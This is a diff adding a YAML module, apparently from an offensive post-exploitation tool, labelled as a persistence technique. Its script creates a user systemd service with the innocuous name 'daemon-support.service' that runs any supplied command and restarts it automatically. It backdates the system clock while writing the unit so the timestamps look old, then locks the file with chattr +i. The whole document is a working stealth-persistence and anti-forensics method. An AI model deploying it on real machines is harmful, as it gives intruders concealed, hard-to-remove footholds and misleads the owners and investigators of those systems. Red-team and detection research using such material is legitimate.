@@ -1,0 +1,32 @@
+name: "service creator"
+description: "Creates a systemd service that runs a command"
+category: persistence
+need_root: false
+variables:
+  - name: cmd
+    description: "Command to execute"
+priority: 1000
+tip: "Command '{{cmd}}' is running as a service"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  mkdir -p ~/.config/systemd/user
+  echo '[Unit]' > ~/.config/systemd/user/daemon-support.service
+  echo 'Description=Start daemon at boot time' >> ~/.config/systemd/user/daemon-support.service
+  echo 'After=' >> ~/.config/systemd/user/daemon-support.service
+  echo 'Requires=' >> ~/.config/systemd/user/daemon-support.service
+  echo '[Service]' >> ~/.config/systemd/user/daemon-support.service
+  echo 'RemainAfterExit=yes' >> ~/.config/systemd/user/daemon-support.service
+  echo 'RestartSec=10s' >> ~/.config/systemd/user/daemon-support.service
+  echo 'Restart=always' >> ~/.config/systemd/user/daemon-support.service
+  echo 'TimeoutStartSec=5' >> ~/.config/systemd/user/daemon-support.service
+  echo "ExecStart=$SHELL -c '{{cmd}}'" >> ~/.config/systemd/user/daemon-support.service
+  echo '[Install]' >> ~/.config/systemd/user/daemon-support.service
+  echo 'WantedBy=default.target' >> ~/.config/systemd/user/daemon-support.service
+  touch ~/.config ~/.config/systemd ~/.config/systemd/user ~/.config/systemd/user/daemon-support.service
+  chattr +i ~/.config/systemd/user/daemon-support.service
+  date -s "$NOW"
+  unset NOW
+  SOCKET_DIR="/run/user/$(id -u)"
+  XDG_RUNTIME_DIR=$SOCKET_DIR systemctl --user enable daemon-support.service
+  XDG_RUNTIME_DIR=$SOCKET_DIR systemctl --user restart daemon-support.service
